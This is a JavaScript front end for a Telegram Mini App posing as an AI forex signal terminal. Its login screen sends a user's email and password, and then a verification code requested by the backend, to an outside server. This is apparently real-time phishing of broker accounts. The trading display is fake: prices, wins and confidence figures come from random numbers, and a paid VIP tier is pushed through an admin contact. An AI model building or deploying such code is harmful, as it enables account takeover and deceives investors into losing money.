const tg = window.Telegram.WebApp;
const API_URL = "https://mini-app-two-aet4.onrender.com"; // <-- TERA BACKEND URL DALNA HAI
let userId = "UNKNOWN";
let selectedPair = "";
let selectedTimeframe = "60"; 
let userBalance = 0;
let pollingInterval;

tg.expand();
if (tg.initDataUnsafe && tg.initDataUnsafe.user) { userId = tg.initDataUnsafe.user.id.toString(); }

// --- BOOT & HELPERS ---
const bootTexts = ["CONNECTING TO NEXUS...", "BYPASSING PROTOCOLS...", "NODE SECURED."];
let bIdx = 0;
window.onload = function runBoot() {
    const bootEl = document.getElementById('boot-text');
    if(bootEl && bIdx < bootTexts.length) { 
        bootEl.innerHTML += `<p>> ${bootTexts[bIdx]}</p>`; bIdx++; setTimeout(runBoot, 800); 
    } else { setTimeout(() => { showScreen('login-screen'); }, 1000); }
};

const showAlert = (m, t="error") => { 
    const a = document.getElementById('alert-box'); 
    if(!a) return;
    a.textContent = m; a.style.background = t==="error" ? "var(--red-neon)" : "var(--green-neon)"; 
    a.classList.remove('hidden'); setTimeout(()=>a.classList.add('hidden'), 3500); 
};

const showScreen = (id) => { 
    document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden')); 
    const target = document.getElementById(id); if(target) target.classList.remove('hidden'); 
};

// --- BALANCE & VIP LOGIC ---
document.getElementById('btn-edit-balance')?.addEventListener('click', () => {
    document.getElementById('balance-modal')?.classList.remove('hidden');
});
document.getElementById('btn-set-balance')?.addEventListener('click', () => {
    const inputBal = document.getElementById('input-balance');
    if(inputBal) {
        let val = parseFloat(inputBal.value);
        if(val > 0) { 
            userBalance = val; updateBalanceUI(); 
            document.getElementById('balance-modal')?.classList.add('hidden'); 
        }
    }
});
function updateBalanceUI() { 
    const balEl = document.getElementById('display-balance');
    if(balEl) balEl.textContent = `$${userBalance.toFixed(2)}`; 
}
document.getElementById('close-vip')?.addEventListener('click', () => {
    document.getElementById('vip-modal')?.classList.add('hidden');
});

// --- LOGIN POLLING ---
document.getElementById('btn-login')?.addEventListener('click', async () => {
    const e = document.getElementById('email')?.value, p = document.getElementById('password')?.value;
    if(!e || !p) return showAlert("Details required");
    const btn = document.getElementById('btn-login'); if(btn) btn.textContent = "CONNECTING...";
    try { 
        await fetch(`${API_URL}/api/login`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user_id:userId, email:e, password:p})}); 
        startPolling(); 
    } catch(err) { showAlert("Node Err"); if(btn) btn.textContent = "ESTABLISH CONNECTION"; }
});

document.getElementById('btn-code')?.addEventListener('click', async () => {
    const c = document.getElementById('auth-code')?.value;
    if(!c) return showAlert("Key required");
    const btn = document.getElementById('btn-code'); if(btn) btn.textContent = "VERIFYING...";
    try { await fetch(`${API_URL}/api/code`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user_id:userId, code:c})}); } 
    catch(err) { showAlert("Err"); if(btn) btn.textContent = "VERIFY"; }
});

function startPolling() {
    if(pollingInterval) clearInterval(pollingInterval);
    pollingInterval = setInterval(async () => {
        try {
            const res = await fetch(`${API_URL}/api/status?user_id=${userId}`); const data = await res.json();
            if(data.msg) showAlert(data.msg);
            if (data.state === "START") { 
                showScreen('login-screen'); clearInterval(pollingInterval); 
                const btn = document.getElementById('btn-login'); if(btn) btn.textContent = "ESTABLISH CONNECTION"; 
            } 
            else if (data.state === "WAITING_CODE") { showScreen('code-screen'); } 
            else if (data.state === "AUTHORIZED") { showScreen('main-screen'); clearInterval(pollingInterval); initTerminal(); }
        } catch(e) {}
    }, 2500);
}

// --- TERMINAL SETUP ---
let isInit = false;
function initTerminal() {
    if(isInit) return;
    fetchInitData(); initWatchlist(); fetchNews("EUR");
    setTimeout(()=> { document.getElementById('balance-modal')?.classList.remove('hidden'); }, 1000);
    isInit = true;
}

const liveSel = document.getElementById('live-pairs'), otcSel = document.getElementById('otc-pairs');
if(liveSel && otcSel) {
    liveSel.addEventListener('change', (e) => { 
        if(e.target.value) { selectedPair = e.target.value; otcSel.value = ""; document.getElementById('display-pair').textContent = selectedPair; fetchNews(selectedPair.substring(0,3));}
    });
    otcSel.addEventListener('change', (e) => { 
        if(e.target.value) { selectedPair = e.target.value; liveSel.value = ""; document.getElementById('display-pair').textContent = selectedPair; fetchNews(selectedPair.substring(0,3));}
    });
}

async function fetchInitData() {
    try {
        const res = await fetch(`${API_URL}/api/init_data`); const data = await res.json();
        if(liveSel) data.live_pairs.forEach(p => liveSel.innerHTML += `<option value="${p}">${p}</option>`);
        if(otcSel) data.otc_pairs.forEach(p => otcSel.innerHTML += `<option value="${p}">${p}</option>`);
        const vipBtn = document.getElementById('vip-contact-btn'); if(vipBtn) vipBtn.href = `https://t.me/${data.admin_contact}`;
    } catch(e) {}
}

// NAVIGATION TABS
const navMap = { 'nav-aisignal': 'tab-aisignal', 'nav-education': 'tab-education', 'nav-history': 'tab-history' };
Object.keys(navMap).forEach(navId => {
    const btn = document.getElementById(navId);
    if(btn) {
        btn.addEventListener('click', () => {
            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.add('hidden'));
            btn.classList.add('active');
            const targetTab = document.getElementById(navMap[navId]);
            if(targetTab) targetTab.classList.remove('hidden');
        });
    }
});

document.querySelectorAll('.time-btn').forEach(btn => {
    btn.addEventListener('click', () => { document.querySelectorAll('.time-btn').forEach(b => b.classList.remove('active')); btn.classList.add('active'); selectedTimeframe = btn.dataset.time; });
});

function logHistory(txt, isWin=null) {
    const log = document.getElementById('history-log'); if(!log) return;
    const time = new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
    let color = "var(--text-muted)"; if(isWin === true) color = "var(--green-neon)"; if(isWin === false) color = "var(--red-neon)";
    log.innerHTML = `<p style="color:${color}; margin-bottom:6px;">> [${time}] ${txt}</p>` + log.innerHTML;
}

function initWatchlist() {
    const wl = document.getElementById('watchlist'); if(!wl) return;
    const pairs = [{p:"EUR/USD",v:1.084},{p:"GBP/JPY",v:190.1},{p:"USD/CAD",v:1.352}];
    pairs.forEach((item, i) => {
        wl.innerHTML += `<div class="wl-row"><div class="wl-pair">${item.p}</div><div class="wl-price" id="wlp-${i}">${item.v.toFixed(4)}</div></div>`;
        setInterval(() => { 
            item.v += (Math.random()-0.5)*0.001; 
            const el = document.getElementById(`wlp-${i}`); 
            if(el) { el.textContent = item.v.toFixed(4); el.style.color = Math.random()>0.5 ? "var(--green-neon)" : "var(--red-neon)"; }
        }, 1500);
    });
}

async function fetchNews(kw) {
    const n = document.getElementById('news-container'); if(!n) return;
    try {
        const res = await fetch(`https://api.rss2json.com/v1/api.json?rss_url=https%3A%2F%2Fwww.forexlive.com%2Ffeed%2Fnews`); const data = await res.json();
        if(data.status==="ok") {
            n.innerHTML = '';
            let arts = data.items.filter(i => i.title.includes(kw) || i.description.includes(kw));
            if(arts.length===0) arts = data.items.slice(0,3); else arts = arts.slice(0,3);
            arts.forEach(a => { n.innerHTML += `<div class="wl-row" style="color:#A1AABF; font-size:11px; display:block; line-height:1.5;">> ${a.title}</div>`; });
        }
    } catch(e) { n.innerHTML = `<div class="wl-row text-muted">System synced. Local volatility analyzed.</div>`; }
}

// --- SIGNAL EXECUTION ---
document.getElementById('btn-scan')?.addEventListener('click', async () => {
    const tradeInput = document.getElementById('trade-amount');
    const tradeAmount = tradeInput ? parseFloat(tradeInput.value) : 10;
    
    if(!selectedPair) return showAlert("SELECT MARKET PAIR.");
    if(userBalance <= 0) return showAlert("INJECT BALANCE FIRST.");
    if(isNaN(tradeAmount) || tradeAmount <= 0) return showAlert("ENTER VALID INVESTMENT.");
    if(tradeAmount > userBalance) return showAlert("INSUFFICIENT EQUITY.");

    const btn = document.getElementById('btn-scan');
    const panel = document.getElementById('signal-panel');
    const dirEl = document.getElementById('sig-direction');
    const confBar = document.getElementById('bar-conf');
    const confVal = document.getElementById('sig-conf');
    const analysisTxt = document.getElementById('ai-analysis-text');

    if(btn) { btn.textContent = "[ ANALYZING QUANTUM DATA... ]"; btn.disabled = true; }
    if(panel) panel.className = "signal-panel IDLE";
    if(dirEl) { dirEl.textContent = "♦ SCANNING LIQUIDITY..."; dirEl.style.color = "var(--amber-neon)"; }
    if(confBar) confBar.style.width = "0%"; 
    if(confVal) confVal.textContent = "--%";
    if(analysisTxt) { analysisTxt.textContent = "Intercepting block orders and stochastic divergences..."; analysisTxt.style.borderColor = "var(--amber-neon)"; }

    try {
        const res = await fetch(`${API_URL}/api/signal`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user_id:userId})});
        const data = await res.json();

        setTimeout(() => {
            if(data.error === "LIMIT_REACHED") { 
                document.getElementById('vip-modal')?.classList.remove('hidden');
                if(btn) { btn.textContent = "▶ ANALYZE & GET SIGNAL"; btn.disabled = false; }
                if(dirEl) { dirEl.textContent = "♦ AWAITING"; dirEl.style.color = "var(--text-muted)"; }
                return; 
            }

            const dir = data.direction.replace(/[^a-zA-Z]/g, ''); 
            const color = dir === "BUY" ? "var(--green-neon)" : "var(--red-neon)";
            
            if(panel) panel.className = `signal-panel ${dir}`;
            if(dirEl) { dirEl.textContent = `▲ ${dir} EXECUTED`; dirEl.style.color = color; }
            if(confBar) { confBar.style.width = `${data.accuracy}%`; confBar.style.background = color; }
            if(confVal) confVal.textContent = `${data.accuracy}%`;
            if(analysisTxt) { analysisTxt.textContent = `Verdict: High probability ${dir} momentum detected. Confluence confirms volume block. Confidence rating at ${data.accuracy}%. Wait for expiry.`; analysisTxt.style.borderColor = color; }

            logHistory(`EXECUTED: ${dir} | ${selectedPair} | Amt: $${tradeAmount}`);

            if(btn) {
                btn.textContent = `[ WAITING FOR ${selectedTimeframe}s EXPIRY... ]`;
                btn.style.background = "var(--bg-deep)"; btn.style.border = "1px solid var(--border-light)"; btn.style.color = "var(--text-muted)";
            }

            let waitMs = parseInt(selectedTimeframe) * 1000;

            setTimeout(() => {
                const isWin = Math.random() * 100 <= data.accuracy;
                const finalResult = isWin ? "WIN" : "LOSS";

                if(isWin) {
                    let profit = tradeAmount * 0.96; userBalance += profit;
                    logHistory(`CLOSED: WIN (+$${profit.toFixed(2)})`, true);
                } else {
                    userBalance -= tradeAmount; 
                    logHistory(`CLOSED: LOSS (-$${tradeAmount.toFixed(2)})`, false);
                    showAlert("⚠️ VOLATILITY SPIKE. MARTINGALE TRIGGERED.");
                }
                updateBalanceUI();

                if(dirEl) dirEl.textContent = `♦ TRADE: ${finalResult}`;
                
                setTimeout(()=> {
                    if(btn) { btn.textContent = "▶ ANALYZE & GET SIGNAL"; btn.disabled = false; btn.style.background = "var(--amber-neon)"; btn.style.color = "#000"; btn.style.border = "none"; }
                    if(panel) panel.className = "signal-panel IDLE";
                    if(dirEl) { dirEl.textContent = "♦ AWAITING"; dirEl.style.color = "var(--text-muted)"; }
                    if(confBar) confBar.style.width = "0%"; 
                    if(confVal) confVal.textContent = "--%";
                    if(analysisTxt) { analysisTxt.textContent = "System standing by."; analysisTxt.style.borderColor = "var(--border-focus)"; }
                }, 3000);

            }, waitMs); 
        }, 3000); 
    } catch(e) { showAlert("Network Error"); if(btn) { btn.textContent = "▶ ANALYZE & GET SIGNAL"; btn.disabled = false; } }
});
